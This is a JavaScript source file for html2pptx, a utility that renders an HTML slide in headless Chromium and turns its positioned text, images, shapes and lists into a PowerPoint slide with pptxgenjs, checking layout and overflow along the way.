/**
 * html2pptx - Convert HTML slide to pptxgenjs slide with positioned elements
 *
 * USAGE:
 *   const pptx = new pptxgen();
 *   pptx.layout = 'LAYOUT_16x9';  // Must match HTML body dimensions
 *
 *   const { slide, placeholders } = await html2pptx('slide.html', pptx);
 *   slide.addChart(pptx.charts.LINE, data, placeholders[0]);
 *
 *   await pptx.writeFile('output.pptx');
 *
 * FEATURES:
 *   - Converts HTML to PowerPoint with accurate positioning
 *   - Supports text, images, shapes, and bullet lists
 *   - Extracts placeholder elements (class="placeholder") with positions
 *   - Handles CSS gradients, borders, and margins
 *
 * VALIDATION:
 *   - Uses body width/height from HTML for viewport sizing
 *   - Throws error if HTML dimensions don't match presentation layout
 *   - Throws error if content overflows body (with overflow details)
 *
 * RETURNS:
 *   { slide, placeholders } where placeholders is an array of { id, x, y, w, h }
 */

const { chromium } = require('playwright');
const path = require('path');
const sharp = require('sharp');

const PT_PER_PX = 0.75;
const PX_PER_IN = 96;
const EMU_PER_IN = 914400;

// Helper: Get body dimensions and check for overflow
async function getBodyDimensions(page) {
  const bodyDimensions = await page.evaluate(() => {
    const body = document.body;
    const style = window.getComputedStyle(body);

    return {
      width: parseFloat(style.width),
      height: parseFloat(style.height),
      scrollWidth: body.scrollWidth,
      scrollHeight: body.scrollHeight
    };
  });

  const errors = [];
  const widthOverflowPx = Math.max(0, bodyDimensions.scrollWidth - bodyDimensions.width - 1);
  const heightOverflowPx = Math.max(0, bodyDimensions.scrollHeight - bodyDimensions.height - 1);

  const widthOverflowPt = widthOverflowPx * PT_PER_PX;
  const heightOverflowPt = heightOverflowPx * PT_PER_PX;

  if (widthOverflowPt > 0 || heightOverflowPt > 0) {
    const directions = [];
    if (widthOverflowPt > 0) directions.push(`${widthOverflowPt.toFixed(1)}pt horizontally`);
    if (heightOverflowPt > 0) directions.push(`${heightOverflowPt.toFixed(1)}pt vertically`);
    const reminder = heightOverflowPt > 0 ? ' (Remember: leave 0.5" margin at bottom of slide)' : '';
    errors.push(`HTML content overflows body by ${directions.join(' and ')}${reminder}`);
  }

  return { ...bodyDimensions, errors };
}

// Helper: Validate dimensions match presentation layout
function validateDimensions(bodyDimensions, pres) {
  const errors = [];
  const widthInches = bodyDimensions.width / PX_PER_IN;
  const heightInches = bodyDimensions.height / PX_PER_IN;

  if (pres.presLayout) {
    const layoutWidth = pres.presLayout.width / EMU_PER_IN;
    const layoutHeight = pres.presLayout.height / EMU_PER_IN;

    if (Math.abs(layoutWidth - widthInches) > 0.1 || Math.abs(layoutHeight - heightInches) > 0.1) {
      errors.push(
        `HTML dimensions (${widthInches.toFixed(1)}" × ${heightInches.toFixed(1)}") ` +
        `don't match presentation layout (${layoutWidth.toFixed(1)}" × ${layoutHeight.toFixed(1)}")`
      );
    }
  }
  return errors;
}

function validateTextBoxPosition(slideData, bodyDimensions) {
  const errors = [];
  const slideHeightInches = bodyDimensions.height / PX_PER_IN;
  const minBottomMargin = 0.5; // 0.5 inches from bottom

  for (const el of slideData.elements) {
    // Check text elements (p, h1-h6, list)
    if (['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'list'].includes(el.type)) {
      const fontSize = el.style?.fontSize || 0;
      const bottomEdge = el.position.y + el.position.h;
      const distanceFromBottom = slideHeightInches - bottomEdge;

      if (fontSize > 12 && distanceFromBottom < minBottomMargin) {
        const getText = () => {
          if (typeof el.text === 'string') return el.text;
          if (Array.isArray(el.text)) return el.text.find(t => t.text)?.text || '';
          if (Array.isArray(el.items)) return el.items.find(item => item.text)?.text || '';
          return '';
        };
        const textPrefix = getText().substring(0, 50) + (getText().length > 50 ? '...' : '');

        errors.push(
          `Text box "${textPrefix}" ends too close to bottom edge ` +
          `(${distanceFromBottom.toFixed(2)}" from bottom, minimum ${minBottomMargin}" required)`
        );
      }
    }
  }

  return errors;
}

// Helper: Add background to slide
async function addBackground(slideData, targetSlide, tmpDir) {
  if (slideData.background.type === 'image' && slideData.background.path) {
    let imagePath = slideData.background.path.startsWith('file://')
      ? slideData.background.path.replace('file://', '')
      : slideData.background.path;
    targetSlide.background = { path: imagePath };
  } else if (slideData.background.type === 'color' && slideData.background.value) {
    targetSlide.background = { color: slideData.background.value };
  }
}

// Helper: Add elements to slide
function addElements(slideData, targetSlide, pres) {
  for (const el of slideData.elements) {
    if (el.type === 'image') {
      let imagePath = el.src.startsWith('file://') ? el.src.replace('file://', '') : el.src;
      targetSlide.addImage({
        path: imagePath,
        x: el.position.x,
        y: el.position.y,
        w: el.position.w,
        h: el.position.h
      });
    } else if (el.type === 'line') {
      targetSlide.addShape(pres.ShapeType.line, {
        x: el.x1,
        y: el.y1,
        w: el.x2 - el.x1,
        h: el.y2 - el.y1,
        line: { color: el.color, width: el.width }
      });
    } else if (el.type === 'shape') {
      const shapeOptions = {
        x: el.position.x,
        y: el.position.y,
        w: el.position.w,
        h: el.position.h,
        shape: el.shape.rectRadius > 0 ? pres.ShapeType.roundRect : pres.ShapeType.rect
      };

      if (el.shape.fill) {
        shapeOptions.fill = { color: el.shape.fill };
        if (el.shape.transparency != null) shapeOptions.fill.transparency = el.shape.transparency;
      }
      if (el.shape.line) shapeOptions.line = el.shape.line;
      if (el.shape.rectRadius > 0) shapeOptions.rectRadius = el.shape.rectRadius;
      if (el.shape.shadow) shapeOptions.shadow = el.shape.shadow;

      targetSlide.addText(el.text || '', shapeOptions);
    } else if (el.type === 'list') {
      const listOptions = {
        x: el.position.x,
        y: el.position.y,
        w: el.position.w,
        h: el.position.h,
        fontSize: el.style.fontSize,
        fontFace: el.style.fontFace,
        color: el.style.color,
        align: el.style.align,
        valign: 'top',
        lineSpacing: el.style.lineSpacing,
        paraSpaceBefore: el.style.paraSpaceBefore,
        paraSpaceAfter: el.style.paraSpaceAfter,
        margin: el.style.margin
      };
      if (el.style.margin) listOptions.margin = el.style.margin;
      targetSlide.addText(el.items, listOptions);
    } else {
      // Check if text is single-line (height suggests one line)
      const lineHeight = el.style.lineSpacing || el.style.fontSize * 1.2;
      const isSingleLine = el.position.h <= lineHeight * 1.5;

      let adjustedX = el.position.x;
      let adjustedW = el.position.w;

      // Make single-line text 2% wider to account for underestimate
      if (isSingleLine) {
        const widthIncrease = el.position.w * 0.02;
        const align = el.style.align;

        if (align === 'center') {
          // Center: expand both sides
          adjustedX = el.position.x - (widthIncrease / 2);
          adjustedW = el.position.w + widthIncrease;
        } else if (align === 'right') {
          // Right: expand to the left
          adjustedX = el.position.x - widthIncrease;
          adjustedW = el.position.w + widthIncrease;
        } else {
          // Left (default): expand to the right
          adjustedW = el.position.w + widthIncrease;
        }
      }

      const textOptions = {
        x: adjustedX,
        y: el.position.y,
        w: adjustedW,
        h: el.position.h,
        fontSize: el.style.fontSize,
        fontFace: el.style.fontFace,
        color: el.style.color,
        bold: el.style.bold,
        italic: el.style.italic,
        underline: el.style.underline,
        valign: 'top',
        lineSpacing: el.style.lineSpacing,
        paraSpaceBefore: el.style.paraSpaceBefore,
        paraSpaceAfter: el.style.paraSpaceAfter,
        inset: 0  // Remove default PowerPoint internal padding
      };

      if (el.style.align) textOptions.align = el.style.align;
      if (el.style.margin) textOptions.margin = el.style.margin;
      if (el.style.rotate !== undefined) textOptions.rotate = el.style.rotate;
      if (el.style.transparency !== null && el.style.transparency !== undefined) textOptions.transparency = el.style.transparency;

      targetSlide.addText(el.text, textOptions);
    }
  }
}

// Helper: Extract slide data from HTML page
async function extractSlideData(page) {
  return await page.evaluate(() => {
    const PT_PER_PX = 0.75;
    const PX_PER_IN = 96;

    // Fonts that are single-weight and should not have bold applied
    // (applying bold causes PowerPoint to use faux bold which makes text wider)
    const SINGLE_WEIGHT_FONTS = ['impact'];

    // Helper: Check if a font should skip bold formatting
    const shouldSkipBold = (fontFamily) => {
      if (!fontFamily) return false;
      const normalizedFont = fontFamily.toLowerCase().replace(/['"]/g, '').split(',')[0].trim();
      return SINGLE_WEIGHT_FONTS.includes(normalizedFont);
    };

    // Unit conversion helpers
    const pxToInch = (px) => px / PX_PER_IN;
    const pxToPoints = (pxStr) => parseFloat(pxStr) * PT_PER_PX;
    const rgbToHex = (rgbStr) => {
      // Handle transparent backgrounds by defaulting to white
      if (rgbStr === 'rgba(0, 0, 0, 0)' || rgbStr === 'transparent') return 'FFFFFF';

      const match = rgbStr.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)/);
      if (!match) return 'FFFFFF';
      return match.slice(1).map(n => parseInt(n).toString(16).padStart(2, '0')).join('');
    };

    const extractAlpha = (rgbStr) => {
      const match = rgbStr.match(/rgba\((\d+),\s*(\d+),\s*(\d+),\s*([\d.]+)\)/);
      if (!match || !match[4]) return null;
      const alpha = parseFloat(match[4]);
      return Math.round((1 - alpha) * 100);
    };

    const applyTextTransform = (text, textTransform) => {
      if (textTransform === 'uppercase') return text.toUpperCase();
      if (textTransform === 'lowercase') return text.toLowerCase();
      if (textTransform === 'capitalize') {
        return text.replace(/\b\w/g, c => c.toUpperCase());
      }
      return text;
    };

    // Extract rotation angle from CSS transform and writing-mode
    const getRotation = (transform, writingMode) => {
      let angle = 0;

      // Handle writing-mode first
      // PowerPoint: 90° = text rotated 90° clockwise (reads top to bottom, letters upright)
      // PowerPoint: 270° = text rotated 270° clockwise (reads bottom to top, letters upright)
      if (writingMode === 'vertical-rl') {
        // vertical-rl alone = text reads top to bottom = 90° in PowerPoint
        angle = 90;
      } else if (writingMode === 'vertical-lr') {
        // vertical-lr alone = text reads bottom to top = 270° in PowerPoint
        angle = 270;
      }

      // Then add any transform rotation
      if (transform && transform !== 'none') {
        // Try to match rotate() function
        const rotateMatch = transform.match(/rotate\((-?\d+(?:\.\d+)?)deg\)/);
        if (rotateMatch) {
          angle += parseFloat(rotateMatch[1]);
        } else {
          // Browser may compute as matrix - extract rotation from matrix
          const matrixMatch = transform.match(/matrix\(([^)]+)\)/);
          if (matrixMatch) {
            const values = matrixMatch[1].split(',').map(parseFloat);
            // matrix(a, b, c, d, e, f) where rotation = atan2(b, a)
            const matrixAngle = Math.atan2(values[1], values[0]) * (180 / Math.PI);
            angle += Math.round(matrixAngle);
          }
        }
      }

      // Normalize to 0-359 range
      angle = angle % 360;
      if (angle < 0) angle += 360;

      return angle === 0 ? null : angle;
    };

    // Get position/dimensions accounting for rotation
    const getPositionAndSize = (el, rect, rotation) => {
      if (rotation === null) {
        return { x: rect.left, y: rect.top, w: rect.width, h: rect.height };
      }

      // For 90° or 270° rotations, swap width and height
      // because PowerPoint applies rotation to the original (unrotated) box
      const isVertical = rotation === 90 || rotation === 270;

      if (isVertical) {
        // The browser shows us the rotated dimensions (tall box for vertical text)
        // But PowerPoint needs the pre-rotation dimensions (wide box that will be rotated)
        // So we swap: browser's height becomes PPT's width, browser's width becomes PPT's height
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;

        return {
          x: centerX - rect.height / 2,
          y: centerY - rect.width / 2,
          w: rect.height,
          h: rect.width
        };
      }

      // For other rotations, use element's offset dimensions
      const centerX = rect.left + rect.width / 2;
      const centerY = rect.top + rect.height / 2;
      return {
        x: centerX - el.offsetWidth / 2,
        y: centerY - el.offsetHeight / 2,
        w: el.offsetWidth,
        h: el.offsetHeight
      };
    };

    // Parse CSS box-shadow into PptxGenJS shadow properties
    const parseBoxShadow = (boxShadow) => {
      if (!boxShadow || boxShadow === 'none') return null;

      // Browser computed style format: "rgba(0, 0, 0, 0.3) 2px 2px 8px 0px [inset]"
      // CSS format: "[inset] 2px 2px 8px 0px rgba(0, 0, 0, 0.3)"

      const insetMatch = boxShadow.match(/inset/);

      // IMPORTANT: PptxGenJS/PowerPoint doesn't properly support inset shadows
      // Only process outer shadows to avoid file corruption
      if (insetMatch) return null;

      // Extract color first (rgba or rgb at start)
      const colorMatch = boxShadow.match(/rgba?\([^)]+\)/);

      // Extract numeric values (handles both px and pt units)
      const parts = boxShadow.match(/([-\d.]+)(px|pt)/g);

      if (!parts || parts.length < 2) return null;

      const offsetX = parseFloat(parts[0]);
      const offsetY = parseFloat(parts[1]);
      const blur = parts.length > 2 ? parseFloat(parts[2]) : 0;

      // Calculate angle from offsets (in degrees, 0 = right, 90 = down)
      let angle = 0;
      if (offsetX !== 0 || offsetY !== 0) {
        angle = Math.atan2(offsetY, offsetX) * (180 / Math.PI);
        if (angle < 0) angle += 360;
      }

      // Calculate offset distance (hypotenuse)
      const offset = Math.sqrt(offsetX * offsetX + offsetY * offsetY) * PT_PER_PX;

      // Extract opacity from rgba
      let opacity = 0.5;
      if (colorMatch) {
        const opacityMatch = colorMatch[0].match(/[\d.]+\)$/);
        if (opacityMatch) {
          opacity = parseFloat(opacityMatch[0].replace(')', ''));
        }
      }

      return {
        type: 'outer',
        angle: Math.round(angle),
        blur: blur * 0.75, // Convert to points
        color: colorMatch ? rgbToHex(colorMatch[0]) : '000000',
        offset: offset,
        opacity
      };
    };

    // Parse inline formatting tags (<b>, <i>, <u>, <strong>, <em>, <span>) into text runs
    const parseInlineFormatting = (element, baseOptions = {}, runs = [], baseTextTransform = (x) => x) => {
      let prevNodeIsText = false;

      element.childNodes.forEach((node) => {
        let textTransform = baseTextTransform;

        const isText = node.nodeType === Node.TEXT_NODE || node.tagName === 'BR';
        if (isText) {
          const text = node.tagName === 'BR' ? '\n' : textTransform(node.textContent.replace(/\s+/g, ' '));
          const prevRun = runs[runs.length - 1];
          if (prevNodeIsText && prevRun) {
            prevRun.text += text;
          } else {
            runs.push({ text, options: { ...baseOptions } });
          }

        } else if (node.nodeType === Node.ELEMENT_NODE && node.textContent.trim()) {
          const options = { ...baseOptions };
          const computed = window.getComputedStyle(node);

          // Handle inline elements with computed styles
          if (node.tagName === 'SPAN' || node.tagName === 'B' || node.tagName === 'STRONG' || node.tagName === 'I' || node.tagName === 'EM' || node.tagName === 'U') {
            const isBold = computed.fontWeight === 'bold' || parseInt(computed.fontWeight) >= 600;
            if (isBold && !shouldSkipBold(computed.fontFamily)) options.bold = true;
            if (computed.fontStyle === 'italic') options.italic = true;
            if (computed.textDecoration && computed.textDecoration.includes('underline')) options.underline = true;
            if (computed.color && computed.color !== 'rgb(0, 0, 0)') {
              options.color = rgbToHex(computed.color);
              const transparency = extractAlpha(computed.color);
              if (transparency !== null) options.transparency = transparency;
            }
            if (computed.fontSize) options.fontSize = pxToPoints(computed.fontSize);

            // Apply text-transform on the span element itself
            if (computed.textTransform && computed.textTransform !== 'none') {
              const transformStr = computed.textTransform;
              textTransform = (text) => applyTextTransform(text, transformStr);
            }

            // Validate: Check for margins on inline elements
            if (computed.marginLeft && parseFloat(computed.marginLeft) > 0) {
              errors.push(`Inline element <${node.tagName.toLowerCase()}> has margin-left which is not supported in PowerPoint. Remove margin from inline elements.`);
            }
            if (computed.marginRight && parseFloat(computed.marginRight) > 0) {
              errors.push(`Inline element <${node.tagName.toLowerCase()}> has margin-right which is not supported in PowerPoint. Remove margin from inline elements.`);
            }
            if (computed.marginTop && parseFloat(computed.marginTop) > 0) {
              errors.push(`Inline element <${node.tagName.toLowerCase()}> has margin-top which is not supported in PowerPoint. Remove margin from inline elements.`);
            }
            if (computed.marginBottom && parseFloat(computed.marginBottom) > 0) {
              errors.push(`Inline element <${node.tagName.toLowerCase()}> has margin-bottom which is not supported in PowerPoint. Remove margin from inline elements.`);
            }

            // Recursively process the child node. This will flatten nested spans into multiple runs.
            parseInlineFormatting(node, options, runs, textTransform);
          }
        }

        prevNodeIsText = isText;
      });

      // Trim leading space from first run and trailing space from last run
      if (runs.length > 0) {
        runs[0].text = runs[0].text.replace(/^\s+/, '');
        runs[runs.length - 1].text = runs[runs.length - 1].text.replace(/\s+$/, '');
      }

      return runs.filter(r => r.text.length > 0);
    };

    // Extract background from body (image or color)
    const body = document.body;
    const bodyStyle = window.getComputedStyle(body);
    const bgImage = bodyStyle.backgroundImage;
    const bgColor = bodyStyle.backgroundColor;

    // Collect validation errors
    const errors = [];

    // Validate: Check for CSS gradients
    if (bgImage && (bgImage.includes('linear-gradient') || bgImage.includes('radial-gradient'))) {
      errors.push(
        'CSS gradients are not supported. Use Sharp to rasterize gradients as PNG images first, ' +
        'then reference with background-image: url(\'gradient.png\')'
      );
    }

    let background;
    if (bgImage && bgImage !== 'none') {
      // Extract URL from url("...") or url(...)
      const urlMatch = bgImage.match(/url\(["']?([^"')]+)["']?\)/);
      if (urlMatch) {
        background = {
          type: 'image',
          path: urlMatch[1]
        };
      } else {
        background = {
          type: 'color',
          value: rgbToHex(bgColor)
        };
      }
    } else {
      background = {
        type: 'color',
        value: rgbToHex(bgColor)
      };
    }

    // Process all elements
    const elements = [];
    const placeholders = [];
    const textTags = ['P', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'UL', 'OL', 'LI'];
    const processed = new Set();

    document.querySelectorAll('*').forEach((el) => {
      if (processed.has(el)) return;

      // Validate text elements don't have backgrounds, borders, or shadows
      if (textTags.includes(el.tagName)) {
        const computed = window.getComputedStyle(el);
        const hasBg = computed.backgroundColor && computed.backgroundColor !== 'rgba(0, 0, 0, 0)';
        const hasBorder = (computed.borderWidth && parseFloat(computed.borderWidth) > 0) ||
                          (computed.borderTopWidth && parseFloat(computed.borderTopWidth) > 0) ||
                          (computed.borderRightWidth && parseFloat(computed.borderRightWidth) > 0) ||
                          (computed.borderBottomWidth && parseFloat(computed.borderBottomWidth) > 0) ||
                          (computed.borderLeftWidth && parseFloat(computed.borderLeftWidth) > 0);
        const hasShadow = computed.boxShadow && computed.boxShadow !== 'none';

        if (hasBg || hasBorder || hasShadow) {
          errors.push(
            `Text element <${el.tagName.toLowerCase()}> has ${hasBg ? 'background' : hasBorder ? 'border' : 'shadow'}. ` +
            'Backgrounds, borders, and shadows are only supported on <div> elements, not text elements.'
          );
          return;
        }
      }

      // Extract placeholder elements (for charts, etc.)
      if (el.className && el.className.includes('placeholder')) {
        const rect = el.getBoundingClientRect();
        if (rect.width === 0 || rect.height === 0) {
          errors.push(
            `Placeholder "${el.id || 'unnamed'}" has ${rect.width === 0 ? 'width: 0' : 'height: 0'}. Check the layout CSS.`
          );
        } else {
          placeholders.push({
            id: el.id || `placeholder-${placeholders.length}`,
            x: pxToInch(rect.left),
            y: pxToInch(rect.top),
            w: pxToInch(rect.width),
            h: pxToInch(rect.height)
          });
        }
        processed.add(el);
        return;
      }

      // Extract images
      if (el.tagName === 'IMG') {
        const rect = el.getBoundingClientRect();
        if (rect.width > 0 && rect.height > 0) {
          elements.push({
            type: 'image',
            src: el.src,
            position: {
              x: pxToInch(rect.left),
              y: pxToInch(rect.top),
              w: pxToInch(rect.width),
              h: pxToInch(rect.height)
            }
          });
          processed.add(el);
          return;
        }
      }

      // Extract DIVs with backgrounds/borders as shapes
      const isContainer = el.tagName === 'DIV' && !textTags.includes(el.tagName);
      if (isContainer) {
        const computed = window.getComputedStyle(el);
        const hasBg = computed.backgroundColor && computed.backgroundColor !== 'rgba(0, 0, 0, 0)';

        // Validate: Check for unwrapped text content in DIV
        for (const node of el.childNodes) {
          if (node.nodeType === Node.TEXT_NODE) {
            const text = node.textContent.trim();
            if (text) {
              errors.push(
                `DIV element contains unwrapped text "${text.substring(0, 50)}${text.length > 50 ? '...' : ''}". ` +
                'All text must be wrapped in <p>, <h1>-<h6>, <ul>, or <ol> tags to appear in PowerPoint.'
              );
            }
          }
        }

        // Check for background images on shapes
        const bgImage = computed.backgroundImage;
        if (bgImage && bgImage !== 'none') {
          errors.push(
            'Background images on DIV elements are not supported. ' +
            'Use solid colors or borders for shapes, or use slide.addImage() in PptxGenJS to layer images.'
          );
          return;
        }

        // Check for borders - both uniform and partial
        const borderTop = computed.borderTopWidth;
        const borderRight = computed.borderRightWidth;
        const borderBottom = computed.borderBottomWidth;
        const borderLeft = computed.borderLeftWidth;
        const borders = [borderTop, borderRight, borderBottom, borderLeft].map(b => parseFloat(b) || 0);
        const hasBorder = borders.some(b => b > 0);
        const hasUniformBorder = hasBorder && borders.every(b => b === borders[0]);
        const borderLines = [];

        if (hasBorder && !hasUniformBorder) {
          const rect = el.getBoundingClientRect();
          const x = pxToInch(rect.left);
          const y = pxToInch(rect.top);
          const w = pxToInch(rect.width);
          const h = pxToInch(rect.height);

          // Collect lines to add after shape (inset by half the line width to center on edge)
          if (parseFloat(borderTop) > 0) {
            const widthPt = pxToPoints(borderTop);
            const inset = (widthPt / 72) / 2; // Convert points to inches, then half
            borderLines.push({
              type: 'line',
              x1: x, y1: y + inset, x2: x + w, y2: y + inset,
              width: widthPt,
              color: rgbToHex(computed.borderTopColor)
            });
          }
          if (parseFloat(borderRight) > 0) {
            const widthPt = pxToPoints(borderRight);
            const inset = (widthPt / 72) / 2;
            borderLines.push({
              type: 'line',
              x1: x + w - inset, y1: y, x2: x + w - inset, y2: y + h,
              width: widthPt,
              color: rgbToHex(computed.borderRightColor)
            });
          }
          if (parseFloat(borderBottom) > 0) {
            const widthPt = pxToPoints(borderBottom);
            const inset = (widthPt / 72) / 2;
            borderLines.push({
              type: 'line',
              x1: x, y1: y + h - inset, x2: x + w, y2: y + h - inset,
              width: widthPt,
              color: rgbToHex(computed.borderBottomColor)
            });
          }
          if (parseFloat(borderLeft) > 0) {
            const widthPt = pxToPoints(borderLeft);
            const inset = (widthPt / 72) / 2;
            borderLines.push({
              type: 'line',
              x1: x + inset, y1: y, x2: x + inset, y2: y + h,
              width: widthPt,
              color: rgbToHex(computed.borderLeftColor)
            });
          }
        }

        if (hasBg || hasBorder) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            const shadow = parseBoxShadow(computed.boxShadow);

            // Only add shape if there's background or uniform border
            if (hasBg || hasUniformBorder) {
              elements.push({
                type: 'shape',
                text: '',  // Shape only - child text elements render on top
                position: {
                  x: pxToInch(rect.left),
                  y: pxToInch(rect.top),
                  w: pxToInch(rect.width),
                  h: pxToInch(rect.height)
                },
                shape: {
                  fill: hasBg ? rgbToHex(computed.backgroundColor) : null,
                  transparency: hasBg ? extractAlpha(computed.backgroundColor) : null,
                  line: hasUniformBorder ? {
                    color: rgbToHex(computed.borderColor),
                    width: pxToPoints(computed.borderWidth)
                  } : null,
                  // Convert border-radius to rectRadius (in inches)
                  // % values: 50%+ = circle (1), <50% = percentage of min dimension
                  // pt values: divide by 72 (72pt = 1 inch)
                  // px values: divide by 96 (96px = 1 inch)
                  rectRadius: (() => {
                    const radius = computed.borderRadius;
                    const radiusValue = parseFloat(radius);
                    if (radiusValue === 0) return 0;

                    if (radius.includes('%')) {
                      if (radiusValue >= 50) return 1;
                      // Calculate percentage of smaller dimension
                      const minDim = Math.min(rect.width, rect.height);
                      return (radiusValue / 100) * pxToInch(minDim);
                    }

                    if (radius.includes('pt')) return radiusValue / 72;
                    return radiusValue / PX_PER_IN;
                  })(),
                  shadow: shadow
                }
              });
            }

            // Add partial border lines
            elements.push(...borderLines);

            processed.add(el);
            return;
          }
        }
      }

      // Extract bullet lists as single text block
      if (el.tagName === 'UL' || el.tagName === 'OL') {
        const rect = el.getBoundingClientRect();
        if (rect.width === 0 || rect.height === 0) return;

        const liElements = Array.from(el.querySelectorAll('li'));
        const items = [];
        const ulComputed = window.getComputedStyle(el);
        const ulPaddingLeftPt = pxToPoints(ulComputed.paddingLeft);

        // Split: margin-left for bullet position, indent for text position
        // margin-left + indent = ul padding-left
        const marginLeft = ulPaddingLeftPt * 0.5;
        const textIndent = ulPaddingLeftPt * 0.5;

        liElements.forEach((li, idx) => {
          const isLast = idx === liElements.length - 1;
          const runs = parseInlineFormatting(li, { breakLine: false });
          // Clean manual bullets from first run
          if (runs.length > 0) {
            runs[0].text = runs[0].text.replace(/^[•\-\*▪▸]\s*/, '');
            runs[0].options.bullet = { indent: textIndent };
          }
          // Set breakLine on last run
          if (runs.length > 0 && !isLast) {
            runs[runs.length - 1].options.breakLine = true;
          }
          items.push(...runs);
        });

        const computed = window.getComputedStyle(liElements[0] || el);

        elements.push({
          type: 'list',
          items: items,
          position: {
            x: pxToInch(rect.left),
            y: pxToInch(rect.top),
            w: pxToInch(rect.width),
            h: pxToInch(rect.height)
          },
          style: {
            fontSize: pxToPoints(computed.fontSize),
            fontFace: computed.fontFamily.split(',')[0].replace(/['"]/g, '').trim(),
            color: rgbToHex(computed.color),
            transparency: extractAlpha(computed.color),
            align: computed.textAlign === 'start' ? 'left' : computed.textAlign,
            lineSpacing: computed.lineHeight && computed.lineHeight !== 'normal' ? pxToPoints(computed.lineHeight) : null,
            paraSpaceBefore: 0,
            paraSpaceAfter: pxToPoints(computed.marginBottom),
            // PptxGenJS margin array is [left, right, bottom, top]
            margin: [marginLeft, 0, 0, 0]
          }
        });

        liElements.forEach(li => processed.add(li));
        processed.add(el);
        return;
      }

      // Extract text elements (P, H1, H2, etc.)
      if (!textTags.includes(el.tagName)) return;

      const rect = el.getBoundingClientRect();
      const text = el.textContent.trim();
      if (rect.width === 0 || rect.height === 0 || !text) return;

      // Validate: Check for manual bullet symbols in text elements (not in lists)
      if (el.tagName !== 'LI' && /^[•\-\*▪▸○●◆◇■□]\s/.test(text.trimStart())) {
        errors.push(
          `Text element <${el.tagName.toLowerCase()}> starts with bullet symbol "${text.substring(0, 20)}...". ` +
          'Use <ul> or <ol> lists instead of manual bullet symbols.'
        );
        return;
      }

      const computed = window.getComputedStyle(el);
      const rotation = getRotation(computed.transform, computed.writingMode);
      const { x, y, w, h } = getPositionAndSize(el, rect, rotation);

      const baseStyle = {
        fontSize: pxToPoints(computed.fontSize),
        fontFace: computed.fontFamily.split(',')[0].replace(/['"]/g, '').trim(),
        color: rgbToHex(computed.color),
        align: computed.textAlign === 'start' ? 'left' : computed.textAlign,
        lineSpacing: pxToPoints(computed.lineHeight),
        paraSpaceBefore: pxToPoints(computed.marginTop),
        paraSpaceAfter: pxToPoints(computed.marginBottom),
        // PptxGenJS margin array is [left, right, bottom, top] (not [top, right, bottom, left] as documented)
        margin: [
          pxToPoints(computed.paddingLeft),
          pxToPoints(computed.paddingRight),
          pxToPoints(computed.paddingBottom),
          pxToPoints(computed.paddingTop)
        ]
      };

      const transparency = extractAlpha(computed.color);
      if (transparency !== null) baseStyle.transparency = transparency;

      if (rotation !== null) baseStyle.rotate = rotation;

      const hasFormatting = el.querySelector('b, i, u, strong, em, span, br');

      if (hasFormatting) {
        // Text with inline formatting
        const transformStr = computed.textTransform;
        const runs = parseInlineFormatting(el, {}, [], (str) => applyTextTransform(str, transformStr));

        // Adjust lineSpacing based on largest fontSize in runs
        const adjustedStyle = { ...baseStyle };
        if (adjustedStyle.lineSpacing) {
          const maxFontSize = Math.max(
            adjustedStyle.fontSize,
            ...runs.map(r => r.options?.fontSize || 0)
          );
          if (maxFontSize > adjustedStyle.fontSize) {
            const lineHeightMultiplier = adjustedStyle.lineSpacing / adjustedStyle.fontSize;
            adjustedStyle.lineSpacing = maxFontSize * lineHeightMultiplier;
          }
        }

        elements.push({
          type: el.tagName.toLowerCase(),
          text: runs,
          position: { x: pxToInch(x), y: pxToInch(y), w: pxToInch(w), h: pxToInch(h) },
          style: adjustedStyle
        });
      } else {
        // Plain text - inherit CSS formatting
        const textTransform = computed.textTransform;
        const transformedText = applyTextTransform(text, textTransform);

        const isBold = computed.fontWeight === 'bold' || parseInt(computed.fontWeight) >= 600;

        elements.push({
          type: el.tagName.toLowerCase(),
          text: transformedText,
          position: { x: pxToInch(x), y: pxToInch(y), w: pxToInch(w), h: pxToInch(h) },
          style: {
            ...baseStyle,
            bold: isBold && !shouldSkipBold(computed.fontFamily),
            italic: computed.fontStyle === 'italic',
            underline: computed.textDecoration.includes('underline')
          }
        });
      }

      processed.add(el);
    });

    return { background, elements, placeholders, errors };
  });
}

async function html2pptx(htmlFile, pres, options = {}) {
  const {
    tmpDir = process.env.TMPDIR || '/tmp',
    slide = null
  } = options;

  try {
    // Use Chrome on macOS, default Chromium on Unix
    const launchOptions = { env: { TMPDIR: tmpDir } };
    if (process.platform === 'darwin') {
      launchOptions.channel = 'chrome';
    }

    const browser = await chromium.launch(launchOptions);

    let bodyDimensions;
    let slideData;

    const filePath = path.isAbsolute(htmlFile) ? htmlFile : path.join(process.cwd(), htmlFile);
    const validationErrors = [];

    try {
      const page = await browser.newPage();
      page.on('console', (msg) => {
        // Log the message text to your test runner's console
        console.log(`Browser console: ${msg.text()}`);
      });

      await page.goto(`file://${filePath}`);

      bodyDimensions = await getBodyDimensions(page);

      await page.setViewportSize({
        width: Math.round(bodyDimensions.width),
        height: Math.round(bodyDimensions.height)
      });

      slideData = await extractSlideData(page);
    } finally {
      await browser.close();
    }

    // Collect all validation errors
    if (bodyDimensions.errors && bodyDimensions.errors.length > 0) {
      validationErrors.push(...bodyDimensions.errors);
    }

    const dimensionErrors = validateDimensions(bodyDimensions, pres);
    if (dimensionErrors.length > 0) {
      validationErrors.push(...dimensionErrors);
    }

    const textBoxPositionErrors = validateTextBoxPosition(slideData, bodyDimensions);
    if (textBoxPositionErrors.length > 0) {
      validationErrors.push(...textBoxPositionErrors);
    }

    if (slideData.errors && slideData.errors.length > 0) {
      validationErrors.push(...slideData.errors);
    }

    // Throw all errors at once if any exist
    if (validationErrors.length > 0) {
      const errorMessage = validationErrors.length === 1
        ? validationErrors[0]
        : `Multiple validation errors found:\n${validationErrors.map((e, i) => `  ${i + 1}. ${e}`).join('\n')}`;
      throw new Error(errorMessage);
    }

    const targetSlide = slide || pres.addSlide();

    await addBackground(slideData, targetSlide, tmpDir);
    addElements(slideData, targetSlide, pres);

    return { slide: targetSlide, placeholders: slideData.placeholders };
  } catch (error) {
    if (!error.message.startsWith(htmlFile)) {
      throw new Error(`${htmlFile}: ${error.message}`);
    }
    throw error;
  }
}

